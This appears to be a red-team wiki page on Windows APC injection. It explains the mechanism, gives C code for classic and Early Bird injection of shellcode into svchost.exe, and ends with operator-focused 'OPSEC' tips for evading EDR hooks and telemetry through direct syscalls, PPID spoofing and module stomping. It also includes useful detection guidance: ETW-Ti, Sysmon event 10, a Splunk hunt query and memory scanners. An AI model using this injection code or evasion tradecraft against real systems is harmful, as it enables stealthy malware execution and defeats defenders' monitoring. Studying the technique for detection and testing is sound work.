---
title: APC injection
slug: apc-injection
aliases: [apc-queue-injection, asynchronous-procedure-call-injection]
---
{% raw %}

Asynchronous Procedure Call (APC) injection is a classic Windows code-execution primitive: you allocate and write a payload into a remote process, then ask the kernel to queue a user-mode APC against one of that process's threads. When that thread next enters an alertable wait, the kernel drains the APC queue and your function runs in the thread's context — no `CreateRemoteThread`, no new thread object, no Sysmon event 8. It shows up in red-team loaders, EDR-evasion tooling (Cobalt Strike's `spawnto` chain historically used Early Bird), and in classic malware families (FinFisher, Lazarus loaders). It matters because the bypass is not the allocation — it's the *delivery* — and most naive process-injection telemetry watches the wrong primitive.

## Mental model

Every Windows thread has a user-mode APC queue. When the thread blocks in an *alertable* wait (`SleepEx`, `WaitForSingleObjectEx`, `MsgWaitForMultipleObjectsEx`, `NtWaitForSingleObject` with `Alertable = TRUE`, or `NtTestAlert`), the kernel walks the queue and dispatches each APC by short-circuiting back to user mode at `ntdll!KiUserApcDispatcher`, which calls your routine with the arguments you supplied, then resumes the original wait.

The trick: the "APC routine" is just a function pointer. If you point it at shellcode you wrote into the remote process, that shellcode executes in the victim thread.

```
attacker proc                target proc (e.g. svchost.exe)
   |                              |
   |  OpenProcess(PROC_VM_*)      |
   |  VirtualAllocEx (RX or RW->X)|
   |  WriteProcessMemory --------> [shellcode @ 0x7ff...]
   |                              |
   |  OpenThread(THREAD_SET_CTX)  |
   |  NtQueueApcThread(hThread,   |
   |     ApcRoutine=shellcode) -->[APC pending on TID 1234]
   |                              |
   |                              | thread hits WaitForSingleObjectEx(..., Alertable=TRUE)
   |                              | -> KiUserApcDispatcher -> shellcode()
```

The catch with the classic variant: your target thread must actually enter an alertable wait. Pick the wrong thread (e.g., a worker pegged in a non-alertable `WaitForSingleObject`) and the APC sits forever. This is why operators target known-alertable threads in `svchost.exe`, `lsass.exe` (loud), or use Early Bird against threads you create suspended yourself.

See [[process-injection-techniques]] for the broader taxonomy.

## Tradecraft

### Classic APC injection (existing alertable thread)

Pseudocode against an alertable thread in a benign-looking host:

```c
HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                           PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                           FALSE, pid);
LPVOID rbuf = VirtualAllocEx(hProc, NULL, sc_len,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, rbuf, sc, sc_len, NULL);
DWORD oldp;
VirtualProtectEx(hProc, rbuf, sc_len, PAGE_EXECUTE_READ, &oldp);

HANDLE hThr = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
// Direct syscall preferred; this is the documented Win32 wrapper:
QueueUserAPC((PAPCFUNC)rbuf, hThr, 0);
```

Use `NtQueueApcThread` from `ntdll` (or your own syscall stub) instead of `QueueUserAPC` to avoid the Win32 layer and pick which APC variant you need.

### Early Bird APC

The robust variant: *you* create the suspended process, queue the APC against its initial thread before `ResumeThread`, and the APC fires during `NtTestAlert` inside `LdrInitializeThunk` — before any image entry runs, before most user-mode hooks are even installed.

```c
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL,
               FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

LPVOID rbuf = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(pi.hProcess, rbuf, sc, sc_len, NULL);
DWORD oldp;
VirtualProtectEx(pi.hProcess, rbuf, sc_len, PAGE_EXECUTE_READ, &oldp);

// Direct syscall to NtQueueApcThread
NtQueueApcThread(pi.hThread, (PIO_APC_ROUTINE)rbuf, NULL, NULL, NULL);

ResumeThread(pi.hThread);   // LdrInitializeThunk -> NtTestAlert -> APC
```

Why it works: `LdrInitializeThunk` calls `NtTestAlert`, which drains pending user APCs before the image's `AddressOfEntryPoint` is dispatched. Combine with [[parent-pid-spoofing]] and [[module-stomping]] (drop the shellcode inside an existing legitimate module's `.text` instead of a fresh `VirtualAllocEx`) to flatten the obvious tells. Full walkthrough: [[early-bird-apc]].

### Atom bombing (APC-adjacent)

Tal Liberman's 2016 technique uses the global atom table to smuggle the payload into the target, then a `GlobalGetAtomNameW` ROP'd via APC to call `NtSetContextThread` and pivot execution. It avoids `WriteProcessMemory` entirely. Worth knowing because it shows the APC primitive composed with other gadgets to dodge memory-write telemetry. See [[atom-bombing]].

### Useful tools

- `donut` (TheWover, v1.x) to package .NET/PE/shellcode loaders
- `syscalls.exe` / SysWhispers3 for direct/indirect syscall stubs — pair with [[syscall-direct-and-indirect]]
- `Process Hacker` + `WinObj` to find threads in alertable states (look at thread stacks ending in `KiUserApcDispatcher` or `*Ex` wait APIs)

## Detection and telemetry

EDRs don't sit there blind anymore. The high-signal sources:

- **ETW-Ti (`Microsoft-Windows-Threat-Intelligence`)**: emits events for `NtQueueApcThreadEx`, `NtQueueApcThreadEx2`, `NtSetContextThread`, `NtAllocateVirtualMemory` with cross-PID context. This is the single most useful sensor — and it requires a PPL-anti-malware signed consumer, which is exactly what modern EDR agents are.
- **Kernel callbacks**: `PsSetCreateProcessNotifyRoutineEx`, `PsSetCreateThreadNotifyRoutine`, and `ObRegisterCallbacks` on `PROCESS`/`THREAD` objects let drivers see the `OpenProcess`/`OpenThread` with `THREAD_SET_CONTEXT` ahead of the queue.
- **Sysmon**: event 10 (`ProcessAccess`) with `GrantedAccess` containing `0x0020` (`THREAD_SET_CONTEXT`) or process opens with `0x1F0FFF` is a strong tell. Event 8 (`CreateRemoteThread`) does **not** fire — that's the entire appeal of APC injection, and a hunter who only watches event 8 is blind.
- **Memory anomalies**: floating executable regions (`MEM_PRIVATE` + `PAGE_EXECUTE_READ` not backed by a mapped image) in `svchost.exe` are loud. Moneta and pe-sieve (`pe-sieve.exe /pid <pid>`) flag these reliably.

Splunk-ish hunt pattern (Sysmon + ETW-Ti normalised):

```
event_id IN (10) GrantedAccess="0x1FFFFF" OR GrantedAccess="*0020*"
| where TargetImage IN ("svchost.exe","lsass.exe","explorer.exe")
| join SourceProcessGUID [ search etw_ti event="NtQueueApcThreadEx" ]
| stats count by SourceImage, TargetImage, host
```

Defender for Endpoint surfaces this as `Suspicious APC code injection` and `Process injection into a sensitive process`. CrowdStrike Falcon ties APC queueing to its `InjectedThread` / `InjectionDetectInfo` events.

For ETW evasion attempts that pair with APC delivery, see [[etw-bypass]] and [[edr-hooks-and-unhooking]].

## OPSEC pitfalls

- **Targeting a non-alertable thread.** Your APC never fires, you waste an opening, and the orphaned `MEM_PRIVATE` `RX` region sits there for memory scanners. Enumerate threads and pick one whose top-of-stack ends in `*Ex` wait or `KiUserApcDispatcher` — or use Early Bird so you control the wait.
- **Queueing into your own child process tree.** If the loader's parent process is your beacon, you've just drawn a parent-child line for the investigator. Either reparent (PPID spoof) or inject into an unrelated existing process.
- **`RWX` allocations.** `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` is a Moneta-bait one-liner. Allocate `RW`, write, then `VirtualProtectEx` to `RX`. Better: stomp an existing module ([[module-stomping]]).
- **Naive `ntdll` calls.** User-mode hooks on `NtQueueApcThread`, `NtAllocateVirtualMemory`, `NtProtectVirtualMemory` will inline-detour into the EDR DLL and tag you. Use direct or indirect syscalls — `NtQueueApcThreadEx2` is a newer prototype most static hook tables still miss.
- **Ignoring ETW-Ti.** You cannot patch ETW-Ti from user mode the way you can patch `EtwEventWrite`. If the EDR is a PPL consumer, your kernel-visible queue operation is logged regardless of your user-mode tricks. Plan for it: keep the APC payload small, resolve and unhook in-memory, exit fast.

## References

- https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
- https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-apcs
- https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/
- https://www.ensilo.com/blog-atombombing-brand-new-code-injection-for-windows/
- https://attack.mitre.org/techniques/T1055/004/
- https://github.com/hasherezade/pe-sieve

See also: [[process-injection-techniques]] · [[early-bird-apc]] · [[atom-bombing]] · [[module-stomping]] · [[edr-hooks-and-unhooking]] · [[syscall-direct-and-indirect]] · [[etw-bypass]] · [[parent-pid-spoofing]]
{% endraw %}
